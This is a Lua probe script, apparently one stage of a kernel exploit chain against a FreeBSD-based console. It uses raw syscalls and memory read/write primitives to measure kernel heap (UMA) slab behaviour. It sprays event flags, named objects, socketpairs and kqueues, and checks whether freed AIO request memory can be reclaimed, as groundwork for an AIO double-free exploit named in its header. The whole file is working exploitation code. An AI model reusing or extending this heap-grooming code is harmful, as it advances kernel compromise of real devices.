-- CRASH_CLASS: LOW
-- PROBE 69t: UMA zone measurement via sys 624 oracle
--
-- Measures allocation patterns for the key object sizes targeted
-- by the AIO double-free exploitation:
--   R-object: 48B -> 64B UMA bucket
--   I-object: 88B -> 128B UMA bucket
--
-- Uses sys 624 (VM op counter, +5 per mmap, zero jitter) to detect
-- new slab allocations. When N creates cause a 624 delta jump, a new
-- slab was allocated -> tells us slab capacity and per-CPU cache depth.
--
-- NO double-free, NO race. Pure measurement.

print("=== PROBE 69t: UMA ZONE FENG SHUI MEASUREMENT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function get_624()
    local r = nil
    pcall(function() r = mk(624)(uint64(0)) end)
    return r and N(r) or 0
end

-- ============================================================
-- [A] EVF (evf_create 538) allocation pattern
-- ============================================================
print("[A] EVF allocation pattern (evf_create 538)")
print("  Creating 500 EVFs in batches of 10, recording 624 delta per batch")

local evf_handles = {}
local evf_deltas = {}
local prev_624 = get_624()

for batch = 1, 50 do
    for i = 1, 10 do
        local nm = put_str(string.format("ea_%d_%d", batch, i))
        local ret = nil
        pcall(function() ret = mk(538)(uint64(N(nm)), uint64(0xCAFE0000 + batch * 10 + i)) end)
        if ret then
            local h, l = get_hi_lo(ret)
            if l ~= 0xFFFFFFFF then
                table.insert(evf_handles, ret)
            end
        end
    end
    local cur_624 = get_624()
    local delta = cur_624 - prev_624
    table.insert(evf_deltas, delta)
    prev_624 = cur_624
    if delta > 0 then
        print(string.format("  batch %2d (count %3d): delta=%d", batch, #evf_handles, delta))
    end
end

print(string.format("  Total EVFs created: %d", #evf_handles))
print("  624 deltas (nonzero batches indicate new slab allocation):")
local evf_slab_hits = 0
for i, d in ipairs(evf_deltas) do
    if d > 0 then
        evf_slab_hits = evf_slab_hits + 1
    end
end
print(string.format("  %d slab allocations in 50 batches", evf_slab_hits))
if evf_slab_hits > 0 and #evf_handles > 0 then
    print(string.format("  Estimated objects per slab: ~%d", math.floor(#evf_handles / evf_slab_hits)))
end

if not alive() then print("DEAD after section A"); return end

-- Clean up EVFs
for _, h in ipairs(evf_handles) do
    pcall(function() mk(539)(h) end)
end
evf_handles = {}

-- ============================================================
-- [B] NAMEDOBJ (namedobj_create 557) allocation pattern
-- ============================================================
print("")
print("[B] Namedobj allocation pattern (namedobj_create 557)")

local nobj_handles = {}
local nobj_deltas = {}
prev_624 = get_624()

for batch = 1, 50 do
    for i = 1, 10 do
        local nm = put_str(string.format("nb_%d_%d", batch, i))
        local ret = nil
        pcall(function() ret = mk(557)(uint64(N(nm))) end)
        if ret then
            local h, l = get_hi_lo(ret)
            if l ~= 0xFFFFFFFF then
                table.insert(nobj_handles, ret)
            end
        end
    end
    local cur_624 = get_624()
    local delta = cur_624 - prev_624
    table.insert(nobj_deltas, delta)
    prev_624 = cur_624
    if delta > 0 then
        print(string.format("  batch %2d (count %3d): delta=%d", batch, #nobj_handles, delta))
    end
end

print(string.format("  Total namedobjs created: %d", #nobj_handles))
local nobj_slab_hits = 0
for i, d in ipairs(nobj_deltas) do
    if d > 0 then nobj_slab_hits = nobj_slab_hits + 1 end
end
print(string.format("  %d slab allocations in 50 batches", nobj_slab_hits))
if nobj_slab_hits > 0 and #nobj_handles > 0 then
    print(string.format("  Estimated objects per slab: ~%d", math.floor(#nobj_handles / nobj_slab_hits)))
end

if not alive() then print("DEAD after section B"); return end

for _, h in ipairs(nobj_handles) do
    pcall(function() mk(558)(h) end)
end
nobj_handles = {}

-- ============================================================
-- [C] SOCKETPAIR (sys 135) allocation pattern
-- ============================================================
print("")
print("[C] Socketpair allocation pattern (sys 135)")

local sp_fds = {}
local sp_deltas = {}
prev_624 = get_624()
local sv_buf = memory.alloc(16)

for batch = 1, 50 do
    for i = 1, 10 do
        wd(N(sv_buf), 0xFFFFFFFF)
        wd(N(sv_buf) + 4, 0xFFFFFFFF)
        pcall(function()
            mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv_buf)))
        end)
        local f0 = rd(N(sv_buf)) or 0xFFFFFFFF
        local f1 = rd(N(sv_buf) + 4) or 0xFFFFFFFF
        if f0 ~= 0xFFFFFFFF then
            table.insert(sp_fds, {f0, f1})
        end
    end
    local cur_624 = get_624()
    local delta = cur_624 - prev_624
    table.insert(sp_deltas, delta)
    prev_624 = cur_624
    if delta > 0 then
        print(string.format("  batch %2d (count %3d): delta=%d", batch, #sp_fds, delta))
    end
end

print(string.format("  Total socketpairs created: %d", #sp_fds))
local sp_slab_hits = 0
for i, d in ipairs(sp_deltas) do
    if d > 0 then sp_slab_hits = sp_slab_hits + 1 end
end
print(string.format("  %d slab allocations in 50 batches", sp_slab_hits))
if sp_slab_hits > 0 and #sp_fds > 0 then
    print(string.format("  Estimated objects per slab: ~%d", math.floor(#sp_fds / sp_slab_hits)))
end

if not alive() then print("DEAD after section C"); return end

for _, pair in ipairs(sp_fds) do
    pcall(function() mk(6)(uint64(pair[1])) end)
    pcall(function() mk(6)(uint64(pair[2])) end)
end
sp_fds = {}

-- ============================================================
-- [D] KQUEUE (sys 362) allocation pattern
-- ============================================================
print("")
print("[D] Kqueue allocation pattern (sys 362)")

local kq_fds = {}
local kq_deltas = {}
prev_624 = get_624()

for batch = 1, 50 do
    for i = 1, 10 do
        local ret = nil
        pcall(function() ret = mk(362)() end)
        if ret then
            local fd = sgn(ret)
            if fd >= 0 then table.insert(kq_fds, fd) end
        end
    end
    local cur_624 = get_624()
    local delta = cur_624 - prev_624
    table.insert(kq_deltas, delta)
    prev_624 = cur_624
    if delta > 0 then
        print(string.format("  batch %2d (count %3d): delta=%d", batch, #kq_fds, delta))
    end
end

print(string.format("  Total kqueues created: %d", #kq_fds))
local kq_slab_hits = 0
for i, d in ipairs(kq_deltas) do
    if d > 0 then kq_slab_hits = kq_slab_hits + 1 end
end
print(string.format("  %d slab allocations in 50 batches", kq_slab_hits))
if kq_slab_hits > 0 and #kq_fds > 0 then
    print(string.format("  Estimated objects per slab: ~%d", math.floor(#kq_fds / kq_slab_hits)))
end

if not alive() then print("DEAD after section D"); return end

for _, fd in ipairs(kq_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end
kq_fds = {}

-- ============================================================
-- [E] AIO allocation pattern (sys 669 submit + 662 delete)
-- ============================================================
print("")
print("[E] AIO allocation pattern (sys 669 submit, 664 poll, 662 delete)")

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("  /dev/zero fd=" .. fd_zero)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(one_id)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local aio_deltas_create = {}
local aio_deltas_delete = {}
local aio_ids_all = {}
prev_624 = get_624()

for batch = 1, 30 do
    local batch_ids = {}
    for i = 1, 10 do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(batch_ids, id)
            table.insert(aio_ids_all, id)
        end
    end
    local cur_624 = get_624()
    local delta = cur_624 - prev_624
    table.insert(aio_deltas_create, delta)
    prev_624 = cur_624
    if delta > 0 then
        print(string.format("  submit batch %2d (total %3d): delta=%d", batch, #aio_ids_all, delta))
    end
end

print(string.format("  Total AIO submitted: %d", #aio_ids_all))
local aio_create_hits = 0
for _, d in ipairs(aio_deltas_create) do
    if d > 0 then aio_create_hits = aio_create_hits + 1 end
end
print(string.format("  %d slab allocations in 30 submit batches", aio_create_hits))
if aio_create_hits > 0 and #aio_ids_all > 0 then
    print(string.format("  Estimated AIO objects per slab: ~%d", math.floor(#aio_ids_all / aio_create_hits)))
end

-- Now delete and measure
prev_624 = get_624()
for batch = 1, math.ceil(#aio_ids_all / 10) do
    local lo = (batch - 1) * 10 + 1
    local hi = math.min(batch * 10, #aio_ids_all)
    for i = lo, hi do
        delete_one(aio_ids_all[i])
    end
    local cur_624 = get_624()
    local delta = cur_624 - prev_624
    table.insert(aio_deltas_delete, delta)
    prev_624 = cur_624
    if delta > 0 then
        print(string.format("  delete batch %2d: delta=%d", batch, delta))
    end
end

local aio_delete_hits = 0
for _, d in ipairs(aio_deltas_delete) do
    if d > 0 then aio_delete_hits = aio_delete_hits + 1 end
end
print(string.format("  %d VM ops during %d delete batches", aio_delete_hits, #aio_deltas_delete))

if not alive() then print("DEAD after section E"); return end

-- ============================================================
-- [F] CROSS-ZONE TEST: create AIO, delete, spray EVF, measure
-- ============================================================
print("")
print("[F] Cross-zone test: AIO create+delete -> EVF spray -> overlap detection")

-- Submit 64 AIO requests
local cross_ids = {}
for i = 1, 64 do
    local id = submit_one()
    if id ~= 0 then poll_one(id); table.insert(cross_ids, id) end
end
print(string.format("  Submitted %d AIO requests", #cross_ids))

local pre_delete_624 = get_624()

-- Delete all AIO
for _, id in ipairs(cross_ids) do
    delete_one(id)
end

local post_delete_624 = get_624()
print(string.format("  624 delta from deleting %d AIO: %d",
    #cross_ids, post_delete_624 - pre_delete_624))

-- Now spray EVF to try reclaiming AIO's freed slots
local pre_evf_624 = get_624()
local cross_evf = {}

for i = 1, 128 do
    local nm = put_str(string.format("cx_%04d", i))
    local ret = nil
    pcall(function() ret = mk(538)(uint64(N(nm)), uint64(0xDEAD0000 + i)) end)
    if ret then
        local h, l = get_hi_lo(ret)
        if l ~= 0xFFFFFFFF then table.insert(cross_evf, ret) end
    end
end

local post_evf_624 = get_624()
print(string.format("  Created %d EVFs after AIO deletion", #cross_evf))
print(string.format("  624 delta from EVF spray: %d", post_evf_624 - pre_evf_624))

-- Compare: if EVF delta is LOWER than section A's baseline, zones overlap
-- (EVF used freed AIO memory instead of allocating new slabs)
if evf_slab_hits > 0 then
    local baseline_per_128 = math.ceil(128 * evf_slab_hits / #evf_handles * 10) -- approximate
    print(string.format("  Section A baseline: ~%d slab allocs per 500 EVFs", evf_slab_hits))
    local cross_delta = post_evf_624 - pre_evf_624
    if cross_delta == 0 then
        print("  *** ZERO VM ops for 128 EVFs after AIO deletion!")
        print("  *** This suggests EVFs reclaimed AIO's freed memory (same zone)")
    end
end

-- Clean up
for _, h in ipairs(cross_evf) do
    pcall(function() mk(539)(h) end)
end

if not alive() then print("DEAD after section F"); return end

-- ============================================================
-- [G] CROSS-ZONE TEST: AIO delete -> socketpair spray
-- ============================================================
print("")
print("[G] Cross-zone: AIO delete -> socketpair spray")

local cross_ids2 = {}
for i = 1, 64 do
    local id = submit_one()
    if id ~= 0 then poll_one(id); table.insert(cross_ids2, id) end
end

local pre_del = get_624()
for _, id in ipairs(cross_ids2) do delete_one(id) end
local post_del = get_624()
print(string.format("  Deleted %d AIO, 624 delta=%d", #cross_ids2, post_del - pre_del))

local pre_sp = get_624()
local cross_sp = {}
for i = 1, 64 do
    wd(N(sv_buf), 0xFFFFFFFF); wd(N(sv_buf) + 4, 0xFFFFFFFF)
    pcall(function()
        mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv_buf)))
    end)
    local f0 = rd(N(sv_buf)) or 0xFFFFFFFF
    if f0 ~= 0xFFFFFFFF then
        table.insert(cross_sp, {rd(N(sv_buf)), rd(N(sv_buf) + 4)})
    end
end
local post_sp = get_624()
print(string.format("  Created %d socketpairs, 624 delta=%d", #cross_sp, post_sp - pre_sp))

for _, p in ipairs(cross_sp) do
    pcall(function() mk(6)(uint64(p[1])) end)
    pcall(function() mk(6)(uint64(p[2])) end)
end

-- ============================================================
-- [H] SUMMARY
-- ============================================================
print("")
print("=== SUMMARY ===")
print(string.format("EVF:       %d slab allocs in 500 creates", evf_slab_hits))
print(string.format("Namedobj:  %d slab allocs in 500 creates", nobj_slab_hits))
print(string.format("Socketpr:  %d slab allocs in 500 creates", sp_slab_hits))
print(string.format("Kqueue:    %d slab allocs in 500 creates", kq_slab_hits))
print(string.format("AIO:       %d slab allocs in 300 submits", aio_create_hits))
print("")
print("Cross-zone results tell us which sprays can reclaim AIO memory")
print("")
print("=== PROBE 69t COMPLETE ===")
